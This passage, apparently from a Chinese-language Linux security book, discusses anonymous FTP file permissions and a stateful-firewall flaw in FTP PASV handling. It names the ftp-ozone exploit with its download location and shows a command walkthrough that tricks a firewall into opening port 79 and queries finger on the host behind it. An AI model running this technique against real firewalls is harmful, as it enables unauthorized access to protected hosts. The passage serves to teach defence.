
这个命令实际上比所需的还要“偏执”。如果由于某种原因，你有一些由匿名 FTP 用户拥有但没有写权限的文件，并且你禁用了 `SITE CHMOD` 命令，那么用户就无法将文件设为可写，理论上讲你是安全的。

> 注意：你目前可能锁定了所有设置，但下次 `ftppd` 升级时，你所做的限制可能会被覆盖，或者配置语法发生变化，你可能会发现自己再次暴露。最好的办法是让 FTP 区域没有任何匿名 FTP 用户拥有的文件，从而彻底解决问题。

# 不安全的状态检测防火墙规则

由于 FTP 是一种双通道协议，任何想要支持它的防火墙都必须配置为处理动态创建的数据。相比之下，HTTP 连接是单连接，所有数据都通过它流动，不需要创建和销毁次级通道。

许多常见的免费和商业防火墙被发现了两个问题，可能会影响你的 Linux 安全。

# 防火墙后 FTP 服务器的未经授权端口访问

| | |
|---|---|
| 流行度: | 4 |
| 简单性: | 6 |
| 影响: | 6 |
| 风险等级: | 5 |

FTP 服务器通常被放在 DMZ 的防火墙后面，除了 FTP 流量外，所有访问都被拦截。当 FTP 服务器发送 `PASV` 命令时，防火墙必须为数据连接打开指定的端口，并在完成后将其关闭。遗憾的是，大多数防火墙并没有维护真正的 FTP 会话状态（为了速度而非详尽性），并且可能被骗打开这些端口，方法要么让 FTP 服务器发送包含包含看似 `PASV` 命令的错误消息，要么直接从客户端本身在命令通道上发送 `PASV` 命令。

`Dug Song` 为这种安全漏洞编写了一个利用程序，可用地址为：http://www.mon-key.org/~dugsong/ftp-ozone.c。我们将使用它来连接到位于防火墙后的 FTP 服务器的 79 端口（finger）：

### 证明你无法访问 79 端口

```
hackerbox# nc -v -v secure-ftp.example.com 79

secure-ftp.example.com 79 (finger) : Connection refused

set 0, rcvd 0
```

### 让 ftp-ozone 欺骗防火墙

```
hackerbox# ftp-ozone secure-ftp.example.com 79 &

[ now trying to connect to secure-ftp.example.com 79 ]
```

```
hackerbox# nc secure-ftp.example.com 79

root

Login: /root Name: Superuser

Directory: /root Shell: /bin/bash

On since Sep 17 12:15 (PST) on tty2

  7 hours 18 minutes idle

No mail.

No Plan.
```
